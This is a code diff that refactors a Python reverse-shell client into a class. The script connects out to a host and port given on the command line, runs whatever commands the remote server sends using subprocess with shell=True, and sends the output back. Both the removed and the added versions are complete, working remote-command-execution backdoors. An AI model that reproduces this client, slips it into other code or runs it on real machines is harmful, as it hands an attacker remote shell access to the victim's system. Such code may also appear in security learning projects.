@@ -1,56 +1,108 @@
 import socket
 import subprocess
 import os
+import sys
 
-def init_client(host_ip: str, host_port: str):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+class Client:
+    """
+    Represents a client for remote command execution.
+    """
 
-    print(f'[+] Connecting to {host_ip}.')
-    sock.connect((host_ip, host_port))
-    print(f'[+] Connected to {host_ip}.')
+    def __init__(self, host_ip: str, host_port: str):
+        self.host_ip = host_ip
+        self.host_port = host_port
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.ACK = "ACK"
 
-    try:
-        while True:
-            print('[+] Awaiting reponse.....')
-            msg = sock.recv(1024).decode()
-            print(f'[+] Message received - {msg}')
-            if not msg: # Client disconnected
-                break
-            if msg.lower() == 'exit':
-                print(f'[-] The server has terminated the session.')
-                break
-            elif msg.split(" ")[0] == 'cd':
-                try:
-                    directory = str(msg.split(' ')[1])
-                    directory = os.path.expanduser(directory)
-                    os.chdir(directory)
-                    cur_dir = os.getcwd()
-                    print(f'[+] Changed to {cur_dir}')
-                    sock.send(cur_dir.encode())
-                    print(f'[+] Sent new directory path to server - {cur_dir}')
-                except IndexError:
-                    print('[-] No directory specified.')
-                    sock.send(b'Error: no directory specified')
-            else:
-                command = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                output = command.stdout.read() + command.stderr.read()
-                sock.send(output)
-                print(f'[+] Sent command output to server - {output.decode()}')
-            
-            print('[+] Awaiting ACK from server.....')
-            ack = sock.recv(1024).decode()
-            if ack != "ACK":
-                print("[-] An error occurred: no ACK received from the server")
-                break
-            print('[+] ACK received from server.')
-            
-    except KeyboardInterrupt:
-        print("[+] Keyboard interrupt issued.")
-    except Exception as e:
-        print(f"An error occurred: {e}")
-    finally:
-        sock.close()
+    def connect(self):
+        """
+        Connects to the server.
+        """
 
-HOST_IP = '127.0.0.1'
-HOST_PORT = 2222
-init_client(HOST_IP, HOST_PORT)
+        print(f'[+] Connecting to {self.host_ip}.')
+        self.sock.connect((self.host_ip, self.host_port))
+        print(f'[+] Connected to {self.host_ip}.') 
+
+    def process_message(self, msg: str):
+        """
+        Processes the incoming message and sends the response to the server.
+        """
+
+        print(f'[+] Message received - {msg}')
+        if msg.split(" ")[0] == 'cd':
+            self.change_directory(msg)
+        else:
+            self.execute_command(msg)
+
+    def change_directory(self, msg: str):
+        """
+        Changes the current directory.
+        """
+
+        try:
+            directory = str(msg.split(' ')[1])
+            directory = os.path.expanduser(directory)
+            os.chdir(directory)
+            cur_dir = os.getcwd()
+            print(f'[+] Changed to {cur_dir}')
+            self.sock.send(cur_dir.encode())
+            print(f'[+] Sent new directory path to server - {cur_dir}')
+        except IndexError:
+            print('[-] No directory specified.')
+            self.sock.send(b'Error: no directory specified')
+
+    def execute_command(self, msg: str):
+        """
+        Executes the command in the shell and sends the output to the server.
+        """
+
+        command = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = command.stdout.read() + command.stderr.read()
+        self.sock.send(output)
+        print(f'[+] Sent command output to server - {output.decode()}')
+
+    def wait_for_ack(self) -> bool:
+        """
+        Waits for an ACK from the server.
+        """
+
+        print('[+] Awaiting ACK from server.....')
+        ack = self.sock.recv(1024).decode()
+        if ack != self.ACK:
+            print("[-] An error occurred: no ACK received from the server")
+            return False
+        print('[+] ACK received from server.')
+        return True
+    
+    def run(self):
+        """
+        Main loop for receiving messages and processing them.
+        """
+
+        self.connect()
+
+        try:
+            while True:
+                print('[+] Awaiting reponse.....')
+                msg = self.sock.recv(1024).decode()
+
+                if not msg or msg.lower() == 'exit':  # Client disconnected or server terminated the session
+                    break
+
+                self.process_message(msg)
+
+                if not self.wait_for_ack():
+                    break
+
+        except KeyboardInterrupt:
+            print("[+] Keyboard interrupt issued.")
+        except Exception as e:
+            print(f"An error occurred: {e}")
+        finally:
+            self.sock.close()
+
+if __name__ == '__main__':
+    HOST_IP = sys.argv[1]
+    HOST_PORT = int(sys.argv[2])
+    client = Client(HOST_IP, HOST_PORT)
+    client.run()
